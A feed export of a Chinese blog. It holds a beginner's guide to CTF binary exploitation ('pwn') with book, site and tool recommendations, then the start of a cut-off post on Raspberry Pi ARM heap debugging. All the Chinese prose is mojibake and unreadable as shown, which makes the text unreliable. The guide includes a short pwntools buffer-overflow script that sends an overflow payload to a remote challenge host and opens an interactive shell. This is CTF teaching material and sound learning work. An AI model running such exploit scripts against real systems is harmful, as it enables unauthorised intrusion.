        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å†™è¿™ç¯‡æ˜¯å› ä¸ºå­¦æ ¡ç¤¾å›¢æ‹›æ–°éœ€è¦ç»™å­¦å¼Ÿå­¦å¦¹æ¯ä¸ªæ–¹å‘çš„å¤§è‡´å°è±¡ï¼Œå‘å±•æ–¹å‘ï¼Œå½“ç„¶æˆ‘ä¹Ÿå¸Œæœ›è¿™ç¯‡æ–‡ç« å¯ä»¥å¸®åŠ©åˆ°æ›´å¤šçš„äººã€‚æ¥ä¸‹æ¥æˆ‘ä¼šä»‹ç»ä¸€ä¸‹å…¥é—¨pwnéœ€è¦å‡†å¤‡ä¸€äº›ä»€ä¹ˆï¼Œå­¦ä¹ ä¸€äº›ä»€ä¹ˆï¼Œå¸Œæœ›è¿™äº›ä¸æˆç†Ÿçš„æ„è§å¯ä»¥å¸®åŠ©åˆ°åˆšå¼€å§‹å…¥é—¨pwnçš„ä½ ã€‚ç”±äºç¯‡å¹…æœ‰é™ï¼Œè¿™é‡Œä¸ä¼šè¯¦ç»†ä»‹ç»å„ä¸ªçŸ¥è¯†ç‚¹ï¼Œæ›´å¤šçš„æ˜¯ä¸€äº›é“¾æ¥ï¼Œä¸æ¶‰åŠå…·ä½“å†…å®¹ï¼Œåªæ˜¯å¸®ä½ æ‰¾åˆ°ä½ åº”è¯¥å­¦ä»€ä¹ˆï¼Œæ¨èä¸€äº›å­¦ä¹ èµ„æºã€‚</p><h1 id="ä¹¦ç±æ¨è"><a href="#ä¹¦ç±æ¨è" class="headerlink" title="ä¹¦ç±æ¨è"></a>ä¹¦ç±æ¨è</h1><p>è¿™é‡Œæ¨èä¸€äº›é€‚åˆåˆšåˆšå‡†å¤‡å…¥é—¨pwnæ–¹å‘çš„ä¹¦ç±ï¼Œæ‰€ä»¥è¿™é‡Œå¹¶æ²¡æœ‰åˆ—å‡ºä¸€äº›pwnæ–¹å‘å¾ˆé‡è¦ï¼Œä½†ä¸æ˜¯æ–°æ‰‹éœ€è¦çš„ä¹¦ç±ã€‚</p><h2 id="ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ï¼šé“¾æ¥è£…è½½ä¸åº“ã€‹"><a href="#ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ï¼šé“¾æ¥è£…è½½ä¸åº“ã€‹" class="headerlink" title="ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ï¼šé“¾æ¥è£…è½½ä¸åº“ã€‹"></a>ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ï¼šé“¾æ¥è£…è½½ä¸åº“ã€‹</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/1b4c510fd9f9d72a95616a43df2a2834349bbb63" alt="ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»"></p><p>è¿™æœ¬ä¹¦æ˜¯å¯¹pwnå…¥é—¨æ¥è¯´éå¸¸éå¸¸æœ‰ç”¨çš„ä¸€æœ¬ä¹¦ï¼Œå¯ä»¥è¯´æ˜¯ä¸€æœ¬å¿…è¯»çš„ä¹¦ï¼Œèƒ½è®©ä½ æ›´æ¸…æ¥šçš„äº†è§£å¾ˆå¤špwnçŸ¥è¯†ç‚¹èƒŒåçš„é€»è¾‘ã€‚å¯ä»¥è¯´æ˜¯å¿…è¯»çš„ä¹¦äº†ã€‚</p><h2 id="ã€ŠCTFç«èµ›æƒå¨æŒ‡å—ï¼ˆPwnç¯‡ï¼‰ã€‹"><a href="#ã€ŠCTFç«èµ›æƒå¨æŒ‡å—ï¼ˆPwnç¯‡ï¼‰ã€‹" class="headerlink" title="ã€ŠCTFç«èµ›æƒå¨æŒ‡å—ï¼ˆPwnç¯‡ï¼‰ã€‹"></a>ã€ŠCTFç«èµ›æƒå¨æŒ‡å—ï¼ˆPwnç¯‡ï¼‰ã€‹</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/0b55b319ebc4b74543a9b3057cb609178a82b901bfc4" alt="ctfæƒå¨æŒ‡å—"></p><p>ä¹¦ä¸­æ¶µç›–äº†pwnå„ä¸ªæ–¹å‘çš„çŸ¥è¯†ç‚¹ï¼Œè™½è¯´å¾ˆå¤šæœ€æ–°çš„çŸ¥è¯†ç‚¹è¯¥ä¹¦ä¸èƒ½æä¾›ï¼Œä½†æ˜¯ä½œä¸ºå…¥é—¨æ•°æ®ï¼Œè¿™æœ¬ä¹¦çš„çŸ¥è¯†ç‚¹èµ·ç å¤Ÿä½ å­¦å¤§åŠå¹´äº†ã€‚æ¯”å¸‚é¢ä¸Šå…¶ä»–ctfå…¥é—¨ä¹¦ç±æ›´åŠ é€‚åˆpwnæ‰‹ï¼Œå¼ºçƒˆæ¨èã€‚</p><h2 id="ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿï¼ˆåˆåCSAPPï¼‰ã€‹"><a href="#ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿï¼ˆåˆåCSAPPï¼‰ã€‹" class="headerlink" title="ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿï¼ˆåˆåCSAPPï¼‰ã€‹"></a>ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿï¼ˆåˆåCSAPPï¼‰ã€‹</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/s29195878.jpg" alt="csapp"></p><p>è¿™æ˜¯ä¸€æœ¬å¾ˆåšé‡çš„ä¹¦ï¼Œè™½è¯´æ²¡æœ‰åƒä¸Šé¢ä¸¤æœ¬ä¹¦é‚£ä¹ˆç›´æ¥å¯¹pwnåšé¢˜æœ‰ç›´æ¥å¸®åŠ©ï¼Œä½†æ˜¯è¿™æœ¬ä¹¦ä¸€å®šæ˜¯pwnæ–¹å‘ï¼Œä¸ä¸ä¸ï¼Œå®ƒå¯ä»¥è¯´æ˜¯æ‰€æœ‰è®¡ç®—æœºæ–¹å‘å¿…è¯»ä¹¦ç±äº†ï¼Œå¯¹ä½ é•¿æœŸæˆé•¿æ¥è¯´è‚¯å®šæœ‰å¸®åŠ©ï¼Œå¸Œæœ›åœ¨é—²æš‡æ—¶é—´å»è¯»ä¸€è¯»ã€‚</p><h1 id="ç½‘ç«™ä»¥åŠå…¥é—¨è§†é¢‘æ¨è"><a href="#ç½‘ç«™ä»¥åŠå…¥é—¨è§†é¢‘æ¨è" class="headerlink" title="ç½‘ç«™ä»¥åŠå…¥é—¨è§†é¢‘æ¨è"></a>ç½‘ç«™ä»¥åŠå…¥é—¨è§†é¢‘æ¨è</h1><p>åˆ·é¢˜ç½‘ç«™å’Œctfwikiè¿™é‡Œå°±ä¸åšè¿‡å¤šçš„èµ˜è¿°äº†ï¼Œè¿™é‡Œæä¾›ä¸€äº›é€‚åˆæ–°äººpwnæ–¹å‘ç‹¬æœ‰çš„å¹³å°ï¼Œå’Œè‡ªå·±è§‰å¾—ä¸é”™çš„å…¥é—¨è§†é¢‘</p><h2 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210719104848925.png" alt="pwnable.kr"></p><p>ç½‘å€ï¼š<a href="https://pwnable.kr/">https://pwnable.kr/</a></p><p>è¿™ä¸ªå¹³å°çš„æ¼æ´è™½ç„¶å’Œæˆ‘ä»¬å›½å†…æ¯”èµ›ä¸»æµæ–¹å‘çš„å…³ç³»ä¸æ˜¯å¾ˆå¤§ï¼Œä½†æ˜¯é‡Œé¢æœ‰å¾ˆå¤šå¯ä»¥å­¦ä¹ çš„çŸ¥è¯†ç‚¹ï¼Œè¿˜æ˜¯å¾ˆæ¨èå¤§å®¶åšä¸€åšçš„ï¼Œå¾ˆå¤šé¢˜ç›®æ¯”è¾ƒé€‚åˆæ–°æ‰‹ã€‚</p><h2 id="XMCVE-2020-CTF-Pwnå…¥é—¨è¯¾ç¨‹"><a href="#XMCVE-2020-CTF-Pwnå…¥é—¨è¯¾ç¨‹" class="headerlink" title="XMCVE 2020 CTF Pwnå…¥é—¨è¯¾ç¨‹"></a>XMCVE 2020 CTF Pwnå…¥é—¨è¯¾ç¨‹</h2><p>ç½‘å€ï¼š<a href="https://www.bilibili.com/video/BV1854y1y7Ro?share_source=copy_web">https://www.bilibili.com/video/BV1854y1y7Ro?share_source=copy_web</a></p><p>è¿™éƒ¨è§†é¢‘å¯ä»¥è¯´æ˜¯å…¨bç«™æœ€ä¸ºè¯¦ç»†çš„pwnå…¥é—¨è§†é¢‘äº†ï¼Œç»†èŠ‚æŠ“çš„å¾ˆæ¸…æ¥šï¼Œç¼ºç‚¹å°±æ˜¯è¿‡äºè¯¦å®ï¼Œå¯èƒ½ä¼šè®©ä½ ç¼ºå°‘ä¸€ä»½è‡ªå·±çš„æ€è€ƒï¼Œè§†é¢‘æ—¶é—´ä¹Ÿè¿‡é•¿ï¼Œéœ€è¦è€å¿ƒè§‚çœ‹</p><h2 id="2020æš‘æœŸLilac-pwnå…¥é—¨åŸ¹è®­"><a href="#2020æš‘æœŸLilac-pwnå…¥é—¨åŸ¹è®­" class="headerlink" title="2020æš‘æœŸLilac-pwnå…¥é—¨åŸ¹è®­"></a>2020æš‘æœŸLilac-pwnå…¥é—¨åŸ¹è®­</h2><p>ç½‘å€ï¼š<a href="https://www.bilibili.com/video/BV1Dt4y1D7mK?share_source=copy_web">https://www.bilibili.com/video/BV1Dt4y1D7mK?share_source=copy_web</a></p><p>è¿™éƒ¨è§†é¢‘å…¶å®æ˜¯æˆ‘å…¥é—¨æ—¶è§‚çœ‹çš„è§†é¢‘ï¼Œä¸ªäººæ„Ÿè§‰è®²è§£çš„å¾ˆå……åˆ†äº†ï¼Œé€‚åˆæƒ³è¦å¿«é€Ÿå…¥é—¨å¼€å§‹åˆ·é¢˜çš„å¸ˆå‚…ä»¬ï¼Œå…¶å®ä»åšå®¢å’Œé¢˜ç›®ä¸­å­¦ä¹ ä¹Ÿæ˜¯ä¸€ç§æ¯”è¾ƒæœ‰æ•ˆçš„æ–¹æ³•</p><h1 id="pwnå…¥é—¨éœ€è¦çš„åŸºç¡€çŸ¥è¯†"><a href="#pwnå…¥é—¨éœ€è¦çš„åŸºç¡€çŸ¥è¯†" class="headerlink" title="pwnå…¥é—¨éœ€è¦çš„åŸºç¡€çŸ¥è¯†"></a>pwnå…¥é—¨éœ€è¦çš„åŸºç¡€çŸ¥è¯†</h1><h2 id="æŒæ¡cè¯­è¨€"><a href="#æŒæ¡cè¯­è¨€" class="headerlink" title="æŒæ¡cè¯­è¨€"></a>æŒæ¡cè¯­è¨€</h2><p>æƒ³è¦å­¦ä¹ pwné¦–å…ˆå°±è¦å­¦ä¹ cè¯­è¨€ï¼Œè¿™æ˜¯æœ€æœ€æœ€åŸºç¡€çš„å·¥ä½œï¼Œå¦‚æœæ²¡æœ‰å­¦ä¹ è¿‡cè¯­è¨€ï¼Œå¯èƒ½è¿é¢˜ç›®éƒ½çœ‹ä¸æ‡‚ã€‚</p><p>æ¨èç¿æºè€å¸ˆçš„cè¯­è¨€è¯¾ç¨‹ï¼š<a href="https://www.icourse163.org/course/ZJU-9001?from=searchPage">https://www.icourse163.org/course/ZJU-9001?from=searchPage</a></p><h2 id="å­¦ä¹ æ±‡ç¼–"><a href="#å­¦ä¹ æ±‡ç¼–" class="headerlink" title="å­¦ä¹ æ±‡ç¼–"></a>å­¦ä¹ æ±‡ç¼–</h2><p>å­¦ä¹ pwnè¿˜æ˜¯è¦æ‡‚æ±‡ç¼–è¯­è¨€çš„ï¼Œèµ·ç å…ˆå­¦ä¹ x86/x64ä¸‹çš„æ±‡ç¼–è¯­è¨€ï¼Œå­¦å¥½æ±‡ç¼–ä¼šè®©ä½ å¼€å§‹çš„è·¯èµ°çš„å¾ˆè½»æ¾ï¼Œå¯ä»¥å…ˆå­¦ä¹ 8060çš„æ±‡ç¼–ï¼Œæ¨èç‹çˆ½è€å¸ˆçš„ã€Šæ±‡ç¼–è¯­è¨€ã€‹</p><h2 id="ä½¿ç”¨ida"><a href="#ä½¿ç”¨ida" class="headerlink" title="ä½¿ç”¨ida"></a>ä½¿ç”¨ida</h2><p>idaæ˜¯ä¸€ä¸ªéå¸¸å¥½ç”¨çš„é™æ€åˆ†æå·¥å…·ï¼Œå¯ä»¥è¯´æ˜¯ä¸€ä¸ªç¥å™¨ï¼Œå¥¹ä¼šå¸®åŠ©ä½ éå¸¸è½»æ¾çš„åˆ†æå‡ºé¢˜ç›®çš„é€»è¾‘ï¼ŒåŸºæœ¬æ˜¯å¿…é¡»ä¼šä½¿ç”¨çš„å·¥å…·ã€‚ä½ ä¼šå‘ç°idaçš„å›¾æ ‡æ˜¯ä¸€ä¸ªå¥³æ€§ï¼Œå…¶å®è¿™æ˜¯ç¬¬ä¸€ä½ç¨‹åºå‘˜ï¼Œå¥¹çš„åå­—å°±å«idaã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210719111139804.png" alt="image-20210719111139804"></p><p>æ¨èä¸€ç¯‡åšå®¢ï¼š<a href="https://xz.aliyun.com/t/4205%EF%BC%8C%E8%BF%99%E9%87%8C%E6%9C%89%E8%AF%A6%E7%BB%86%E7%9A%84%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B">https://xz.aliyun.com/t/4205ï¼Œè¿™é‡Œæœ‰è¯¦ç»†çš„ä½¿ç”¨æ•™ç¨‹</a></p><h2 id="ä½¿ç”¨pwndbg"><a href="#ä½¿ç”¨pwndbg" class="headerlink" title="ä½¿ç”¨pwndbg"></a>ä½¿ç”¨pwndbg</h2><p>è¿™å…¶å®æ˜¯ä¸€ä¸ªgdbçš„è°ƒè¯•æ’ä»¶ï¼Œè¿™ä¸ªå·¥å…·å¯ä»¥å¸®åŠ©ä½ æ›´å¥½çš„è¿›è¡ŒåŠ¨æ€åˆ†æã€‚å…³äºå·¥å…·çš„å®‰è£…å¯ä»¥çœ‹æˆ‘çš„å¦ä¸€ç¯‡åšå®¢ï¼Œè™½ç„¶æ˜¯é’ˆå¯¹armæ¶æ„çš„æ ‘è“æ´¾çš„ï¼Œä½†å¯¹äºx64çš„ubuntuä¹Ÿé€‚ç”¨ã€‚</p><p>å®‰è£…ï¼š<a href="https://kr0emer.com/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/#pwn%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">https://kr0emer.com/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/#pwn%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</a></p><h2 id="ä½¿ç”¨pwntools"><a href="#ä½¿ç”¨pwntools" class="headerlink" title="ä½¿ç”¨pwntools"></a>ä½¿ç”¨pwntools</h2><p>pwnatoolsçš„å®‰è£…ä¸Šé¢çš„é“¾æ¥ä¸­ä¹Ÿæœ‰ï¼Œè¿™æ˜¯ä¸€ä¸ªç¼–å†™pythonäº¤äº’çš„åº“ï¼Œæ˜¯pwnå…¥é—¨å¿…å¤‡çš„å·¥å…·ã€‚</p><p>ç¼–å†™è„šæœ¬ç±»ä¼¼è¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">44908</span>)</span><br><span class="line">sh_addr=<span class="number">0x0804868B</span></span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">24</span>+p32(sh_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">262</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;your username:&quot;</span>,<span class="string">&#x27;kreomer&#x27;</span>) </span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;your passwd:&quot;</span>,payload) </span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>å®˜æ–¹æ•™ç¨‹ï¼š<a href="https://docs.pwntools.com/en/latest/">https://docs.pwntools.com/en/latest/</a></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>pwnå…¥é—¨çš„åŸºç¡€åŸºæœ¬å°±æ˜¯ä»¥ä¸Šè¿™äº›ï¼Œæƒ³è¦äº†è§£å…·ä½“çš„æ”»å‡»æ–¹æ³•å¯ä»¥é€šè¿‡ä»¥ä¸Šä¹¦ç±ã€è§†é¢‘æˆ–è€…å€ŸåŠ©ctfwikiæ¥å­¦ä¹ ï¼ˆ<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/%EF%BC%89%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%8F%AA%E6%98%AF%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%8C%87%E5%8D%97%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E6%B6%89%E5%8F%8A%E5%85%B7%E4%BD%93%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E3%80%82%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%BB%A5%E4%B8%8A%E6%8F%90%E4%BE%9B%E7%9A%84%E9%93%BE%E6%8E%A5%E8%BF%9B%E8%A1%8C%E5%AD%A6%E4%B9%A0%E3%80%82">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/ï¼‰ï¼Œç”±äºåªæ˜¯ä¸€ä¸ªç®€å•çš„æŒ‡å—ï¼Œè¿™é‡Œä¸æ¶‰åŠå…·ä½“æ¼æ´çš„æ”»å‡»æ–¹æ³•ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸Šæä¾›çš„é“¾æ¥è¿›è¡Œå­¦ä¹ ã€‚</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨æ ‘è“æ´¾å®ç°armæ¶æ„ä¸‹çš„heapè°ƒè¯•</title>
      <link href="/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/"/>
      <url>/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€åˆ‡çš„å¼€å§‹"><a href="#ä¸€åˆ‡çš„å¼€å§‹" class="headerlink" title="ä¸€åˆ‡çš„å¼€å§‹"></a>ä¸€åˆ‡çš„å¼€å§‹</h1><p>â€‹    åœ¨æœ€è¿‘åŠå¹´å¤šçš„æ¯”èµ›ä¸­æ€»æ˜¯å¯ä»¥çœ‹åˆ°å¾ˆå¤šéƒ½æ¶‰åŠarmæ¶æ„ï¼Œæ¯”å¦‚ï¼šçº¢æ˜è°·ï¼Œè™ç¬¦ï¼Œå›½èµ›ç­‰å¤§å¤§å°å°çš„æ¯”èµ›éƒ½æ¶‰åŠäº†å…³äºarmæ¶æ„çš„é¢˜ç›®ã€‚å¸¸è§„çš„åšæ³•æ˜¯æ­å»º<strong>quem</strong>è™šæ‹Ÿæœºï¼Œç„¶åä½¿ç”¨<strong>gdbserver</strong>è¿œç¨‹è°ƒè¯•ï¼Œæ¥è¾¾åˆ°è°ƒè¯•ç›®çš„ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å†ç”¨<strong>patchelf</strong>æ”¹ä¸€ä¸‹åŠ¨æ€é“¾æ¥åº“ï¼Œä½¿ç”¨<strong>pythonè„šæœ¬</strong>äº¤äº’ã€‚ä½†æ˜¯è¿™æ ·è°ƒè¯•èµ·æ¥ä¼šå‘ç°æ²¡æœ‰è°ƒè¯•ï¼Œè¿™ç§æƒ…å†µä¸‹å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥çœ‹å†…å­˜åˆ†å¸ƒæ¥è¿›è¡Œè°ƒè¯•ã€‚<strong>ç¼ºå°‘äº†è°ƒè¯•ç¬¦è°ƒè¯•èµ·æ¥æ„Ÿè§‰å¤ªéº»çƒ¦äº†ï¼Œä¹Ÿä¸å¤Ÿç›´è§‚</strong>ã€‚å½“æ—¶çš„ç¬¬ä¸€ååº”æ˜¯ä¸‹è½½<strong>å¸¦è°ƒè¯•ç¬¦çš„libc</strong>ï¼Œå½“æˆ‘æ‰¾åˆ°å¯¹åº”ç‰ˆæœ¬çš„å¸¦æœ‰<strong>.debug</strong>æ–‡ä»¶çš„libcæ–‡ä»¶ï¼Œä½¿ç”¨patchelfå°†å…¶å’Œæˆ‘ä»¬çš„binaryç»‘å®šï¼ŒåŒæ ·ä½¿ç”¨quemæ¥è¿›è¡Œè°ƒè¯•ï¼Œå¯æ˜¯è¿™æ ·ä¾æ—§æ˜¯æ˜¾ç¤ºæ²¡æœ‰è°ƒè¯•ç¬¦ã€‚è€Œä¸”çœ‹ä¹‹å‰å¤§å¸ˆå‚…çš„åšå®¢è¯´quemä¼šå­˜åœ¨ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„bugï¼Œå°±æƒ³æ˜¯å¦å¯ä»¥ç›´æ¥ä½¿ç”¨armæ¶æ„çš„<strong>æ ‘è“æ´¾</strong>æ¥æ­å»ºç¯å¢ƒï¼Œè°ƒè¯•armä¸‹çš„é¢˜ç›®ã€‚ç½‘ä¸Šæˆ‘æŸ¥äº†å¥½ä¹…ä¹Ÿæ²¡æ‰¾åˆ°ç±»ä¼¼çš„æ–‡ç« ï¼Œå°±åªèƒ½è‡ªå·±æ¥è¯•è¯•äº†ï¼Œé¡ºä¾¿å†™å‡ºæ¥åˆ†äº«ç»™å¤§å®¶æˆ‘çš„æ‹™è§ï¼Œå¦‚æœå¯¹ä½ æœ‰å¸®åŠ©å°±å¤ªå¥½äº†ï¼Œä¹Ÿä¹˜æ­¤æœºä¼šæ­å»ºèµ·æ¥è‡ªå·±çš„åšå®¢ï¼Œè¿™å°±æ˜¯æˆ‘å†™è¿™ç¯‡æ–‡ç« çš„å¼€å§‹ï¼Œä¹Ÿæ˜¯æˆ‘åšå®¢çš„å¼€å§‹ã€‚</p><h1 id="æ ‘è“æ´¾çš„é€‰æ‹©å’Œubuntué•œåƒçƒ§å½•"><a href="#æ ‘è“æ´¾çš„é€‰æ‹©å’Œubuntué•œåƒçƒ§å½•" class="headerlink" title="æ ‘è“æ´¾çš„é€‰æ‹©å’Œubuntué•œåƒçƒ§å½•"></a>æ ‘è“æ´¾çš„é€‰æ‹©å’Œubuntué•œåƒçƒ§å½•</h1><h2 id="æ ‘è“æ´¾ä»¥åŠå…¶ä»–ç¡¬ä»¶çš„é€‰æ‹©"><a href="#æ ‘è“æ´¾ä»¥åŠå…¶ä»–ç¡¬ä»¶çš„é€‰æ‹©" class="headerlink" title="æ ‘è“æ´¾ä»¥åŠå…¶ä»–ç¡¬ä»¶çš„é€‰æ‹©"></a>æ ‘è“æ´¾ä»¥åŠå…¶ä»–ç¡¬ä»¶çš„é€‰æ‹©</h2><p>â€‹    æ ‘è“æ´¾æˆ‘é€‰æ‹©çš„æ˜¯<em>Raspberry Pi 4</em>ï¼Œå†…å­˜å¤§å°4GBï¼Œæ„Ÿè§‰å°±è°ƒè¯•armé¢˜ç›®çš„è¯æ€§èƒ½æœ‰ç‚¹æº¢å‡ºï¼Œå› ä¸ºä¸ä½¿ç”¨æ¡Œé¢ï¼Œæ‰€ä»¥å†…å­˜å¯ä»¥é€‰å°ä¸€ç‚¹ï¼Œæ²¡å¿…è¦é€‰æ‹©è¿™ä¹ˆå¤§çš„å†…å­˜ï¼Œå½“ç„¶ä¸€åˆ‡éšä½ å–œå¥½ã€‚è²Œä¼¼è¿˜æœ‰é¦™æ©™æ´¾ï¼Œæˆ‘ä¸çŸ¥é“æ€ä¹ˆæ ·ï¼Œæœ‰å…´è¶£å¯ä»¥å°è¯•ï¼Œä¸ä¿è¯å¯ä»¥æ­é…åé¢çš„æµç¨‹ï¼Œä½†å…¶<strong>ä»·æ ¼</strong>ç¡®å®å¯çˆ±çš„å¤šã€‚</p><p>â€‹    æ ‘è“æ´¾ä½¿ç”¨çš„æ˜¯<strong>tf</strong>å¡ï¼Œæˆ‘è§‰å¾—æ²¡å¿…è¦ä¹°å¤ªå¤§å®¹é‡çš„ï¼Œæˆ‘ç¯å¢ƒå®Œå…¨æ­å»ºå®Œæˆåä¹Ÿæ²¡æœ‰ç”¨å¤ªå¤§çš„å®¹é‡ï¼ŒåŒæ ·æ˜¯å› ä¸ºä¸éœ€è¦æ¡Œé¢çš„åŸå› ã€‚æˆ‘ä»¬å¯ä»¥é€‰æ‹©<strong>16GB</strong>çš„ï¼Œè¿™ä¸ªå®¹é‡åº”è¯¥æ˜¯è¶³å¤Ÿäº†ã€‚é…å¥—çš„éœ€è¦ä¸€ä¸ªä¸€ä¸ª<strong>è¯»å¡å™¨</strong>æ¥çƒ§å½•é•œåƒã€‚</p><p>â€‹    ç”µæºæ˜¯<strong>5.1v=3.0A</strong>çš„ï¼Œ<strong>type-c</strong>æ¥å£ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨æ‰‹æœºå……ç”µå™¨ï¼Œä½†æ˜¯æœ€å¥½è¿˜æ˜¯ä¹°ä¸€ä¸ªå……ç”µå™¨æ¯”è¾ƒå¥½ï¼Œè¿™æ ·æ¯”è¾ƒæ–¹ä¾¿ã€‚ä¹Ÿå¯ä»¥è€ƒè™‘å®˜æ–¹çš„å……ç”µå™¨ï¼Œå°±æ˜¯æœ‰ç‚¹å°è´µã€‚</p><p>â€‹    é¡ºä¾¿ä¸€æï¼Œæœ€å¥½ä¹°ä¸ªâ€œæœºç®±â€ï¼Œè¿™æ ·èƒ½ä¿æŠ¤å¥½ç”µè·¯æ¿ï¼Œæ–¹ä¾¿æºå¸¦ï¼ŒåŒæ—¶è¦åšå¥½æ•£çƒ­å·¥ä½œï¼Œæ•£çƒ­ç‰‡æ˜¯è¦çš„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ªå°é£æ‰‡ã€‚ç±»ä¼¼ä¸‹å›¾</p><p>â€‹    <img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210716193707410.png" alt="æ ‘è“æ´¾æœºç®±å’Œé£æ‰‡"></p><p>â€‹    è¿™é‡Œå¯èƒ½è¿˜éœ€è¦ä½¿ç”¨æ˜¾ç¤ºå±å’Œé”®ç›˜ï¼Œå½“ç„¶åªæœ‰ç¬¬ä¸€æ¬¡æ­å»ºçš„æ—¶å€™éœ€è¦ä½¿ç”¨ï¼Œubuntuå®˜æ–¹æ–‡æ¡£ä¸­è¯´å¯ä»¥ä¸éœ€è¦ï¼Œä½†æ˜¯æˆ‘å°è¯•äº†æœ‰ä¸€æ•´å¤©ï¼Œå¹¶ä¸èƒ½è¾¾åˆ°æˆ‘æƒ³è¦çš„æ•ˆæœï¼Œè¿™é‡Œæ”¾åœ¨åé¢ç¯å¢ƒæ­å»ºçš„æ—¶å€™å†è¯´ã€‚æ ‘è“æ´¾çš„è§†é¢‘æ¥å£æ˜¯<strong>Micro</strong>ï¼Œæ‰€ä»¥ä½ éœ€è¦æœ‰ä¸€å¤´æ˜¯Microçš„è§†é¢‘ä¼ è¾“çº¿ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è½¬æ¢æ¥å£ï¼Œæˆ‘ä½¿ç”¨çš„å°±æ˜¯è½¬æ¢æ¥å£ï¼Œæ¯•ç«Ÿåªç”¨è¿™ä¸€æ¬¡ï¼Œæ²¡å¿…è¦ä¹°å¤ªè´µçš„ï¼Œé”®ç›˜å’Œæ˜¾ç¤ºå±éƒ½æ˜¯å€Ÿç”¨èˆå‹çš„ï¼Œè¿™é‡Œæ„Ÿè°¢æˆ‘çš„èˆå‹ã€‚</p><p>â€‹    ç¡¬ä»¶å°±æ˜¯è¿™äº›å•¦ï¼Œå‡†å¤‡å¥½ç¡¬ä»¶åå°±å¯ä»¥è¿›è¡Œçƒ§å½•å’Œå¯åŠ¨æˆ‘ä»¬çš„ubuntuç³»ç»Ÿå•¦</p><h2 id="ubuntuç¯å¢ƒçš„çƒ§å½•å’Œå¯åŠ¨"><a href="#ubuntuç¯å¢ƒçš„çƒ§å½•å’Œå¯åŠ¨" class="headerlink" 